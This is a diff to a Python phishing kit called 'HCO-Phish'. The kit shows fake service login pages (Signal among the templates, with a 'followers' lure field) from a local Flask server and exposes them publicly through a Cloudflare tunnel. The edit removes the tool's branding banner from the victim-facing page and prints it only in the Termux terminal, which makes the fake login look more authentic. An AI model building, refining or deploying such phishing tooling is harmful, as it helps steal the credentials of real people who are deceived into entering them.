@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# HCO-Phish – Gradient Realistic Login + Cloudflare + Termux Capture
+# HCO-Phish – Termux Header, Realistic Browser Login, Cloudflare Auto
 
 import os, sys, time, subprocess, threading, webbrowser, shutil, re
 from colorama import Fore, init
@@ -32,14 +32,17 @@ gradients={
     "Signal":"linear-gradient(to right, #3a76f0, #5aa0f2)"
 }
 
+# ------------------ Display HCO Phish Header in Termux ------------------ #
+print(Fore.RED + "="*60)
+print(Fore.CYAN + "                 HCO Phish by Azhar                 ")
+print(Fore.RED + "="*60)
+
 choice=None
 while choice not in [str(i) for i in range(1,len(services)+1)]:
-    print(Fore.CYAN+"="*60)
     print(Fore.MAGENTA+"MENU — choose a template (enter number):")
     for idx,s in enumerate(services,1):
         print(Fore.YELLOW+f"{idx}) {s}")
     print(Fore.RED+"0) Exit")
-    print(Fore.CYAN+"="*60)
     choice=input(Fore.GREEN+"Select (1-6): ").strip()
     if choice=="0": sys.exit(Fore.RED+"[!] Exiting...")
 
@@ -53,7 +56,7 @@ print(Fore.CYAN + "[*] Starting local Flask server...")
 # ------------------ Flask App ------------------ #
 app=Flask(__name__)
 
-# ------------------ HTML Template ------------------ #
+# ------------------ HTML Template (No HCO Phish Header) ------------------ #
 dashboard_html=f"""
 <!DOCTYPE html>
 <html>
@@ -67,13 +70,6 @@ font-family:Arial;
 text-align:center;
 margin:0;padding:0;
 height:100vh;
-}}
-header {{
-background:#0d47a1;
-color:red;
-font-size:36px;
-font-weight:bold;
-padding:25px;
 }}
 input, select {{
 padding:10px;
@@ -109,7 +105,6 @@ h1{{margin-top:30px;}}
 </style>
 </head>
 <body>
-<header>HCO Phish by Azhar</header>
 <h1>{selected_service} Login</h1>
 <form method="POST">
 <select name="followers" required>
@@ -158,7 +153,7 @@ def start_cloudflared():
             match=re.search(r"https://[a-zA-Z0-9.-]+trycloudflare\.com",line)
             if match:
                 url=match.group(0)
-                print(Fore.LIGHTGREEN_EX + f"[*] Cloudflare Public URL: {url}")
+                print(Fore.LIGHTGREEN_EX + f"[*] Cloudflare Public URL: {url}/")
                 break
 
 # ------------------ Run Flask ------------------ #
